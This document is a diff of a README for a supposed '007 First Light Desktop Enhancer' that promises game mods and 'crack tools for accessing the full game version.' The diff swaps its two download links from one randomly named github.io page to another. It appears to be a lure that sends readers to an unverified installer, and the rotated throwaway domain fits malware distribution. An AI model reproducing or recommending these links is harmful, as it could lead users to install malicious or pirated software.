@@ -2,7 +2,7 @@
 
 The 007 First Light Desktop Enhancer is your ultimate companion for modifying and optimizing the 007 First Light game on Windows. Designed for enthusiasts who want to push the boundaries of gameplay, this tool offers a suite of features to enhance graphics, performance, and overall experience. Whether you're looking to tweak settings or install mods, this enhancer provides a seamless solution for cracking the full potential of your game in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -71,7 +71,7 @@ Follow these detailed steps to install the 007 First Light Desktop Enhancer on y
 
 Get the latest version of the 007 First Light Desktop Enhancer directly from our trusted source. This includes crack tools for accessing the full game version:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
